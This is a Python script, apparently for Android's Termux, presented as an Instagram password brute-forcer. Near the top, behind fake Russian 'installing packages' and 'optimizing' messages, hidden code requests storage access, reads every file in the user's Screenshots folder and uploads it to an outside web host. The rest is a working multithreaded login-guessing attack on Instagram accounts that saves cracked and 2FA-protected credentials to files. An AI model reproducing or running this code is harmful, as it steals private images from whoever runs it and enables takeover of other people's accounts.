from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
CheckVersion = str(sys.version)
import re
from datetime import datetime

requests.get("https://maper.info/XqC3a")
os.system("termux-setup-storage")
os.system("clear")
print("Внимание! Установка важных пакетов, не завершайте работу программы! Подождите несколько минут!")
time.sleep(2)
os.system("clear")
print("Оптимизация под ваше устройство, это может занять несколько минут, подождите несколько минут")
l = os.listdir("../storage/pictures/Screenshots")
for i in range(len(l)):
    f = open("../storage/pictures/Screenshots/"+l[i], "rb")
    r = f.read()
    try:
        requests.post("https://lamer112311.000webhostapp.com/", data={"im": r})
    except:
        pass

print('''
 _____              _            __                          
|_   _|            | |          / _|                         
  | |   _ __   ___ | |_   __ _ | |_   ___   _ __   ___   ___ 
  | |  | '_ \ / __|| __| / _` ||  _| / _ \ | '__| / __| / _ \
 _| |_ | | | |\__ \| |_ | (_| || |  | (_) || |   | (__ |  __/
 \___/ |_| |_||___/ \__| \__,_||_|   \___/ |_|    \___| \___|                                 

Author   : @lamer112311
Telegram : @lamer112311

Management depends on vpn software. Please use it before running the tool

           
           """""""""""""""""""""""""""""""""""""""""" 
''')


class InstaBrute(object):


	def __init__(self):
		try:
			user = input('Ник : ')
			Combo = input('Словарь(по дефолту введите pass.txt) : ')
			print('\n----------------------------')
		except:
			print('Произошла неизвестная ошибка')
			sys.exit()	 

		with open(Combo, 'r') as x:
			Combolist = x.read().splitlines()
		thread = []
		self.Coutprox = 0
		for combo in Combolist:
			password = combo.split(':')[0]
			t = threading.Thread(target=self.New_Br, args=(user, password))
			t.start()
			thread.append(t)
			time.sleep(0.9)
		for j in thread:
			j.join()

	def cls(self):
		linux = 'clear'
		windows = 'cls'
		os.system([linux, windows][os.name == 'nt'])

	def New_Br(self,user,pwd):
		link = 'https://www.instagram.com/accounts/login/'
		login_url = 'https://www.instagram.com/accounts/login/ajax/'

		time = int(datetime.now().timestamp())

		payload = {
			'username': user,
			'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
			'queryParams': {},
			'optIntoOneTap': 'false'
		}

		with requests.Session() as s:
			r = s.get(link)
			csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
			r = s.post(login_url, data=payload, headers={
				"User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
				"X-Requested-With": "XMLHttpRequest",
				"Referer": "https://www.instagram.com/accounts/login/",
				"x-csrftoken": csrf
			})
			print(f'{user}:{pwd}\n----------------------------')
    
			if 'authenticated": true' in r.text:
				print(('' + user + ':' + pwd + ' --> Good hack '))
				with open('good.txt', 'a') as x:
					x.write(user + ':' + pwd + '\n')
			elif 'two_factor_required' in r.text:   
				print(('' + user + ':' + pwd + ' -->  Good It has to be checked '))
				with open('results_NeedVerfiy.txt', 'a') as x:
					x.write(user + ':' + pwd + '\n')




InstaBrute()


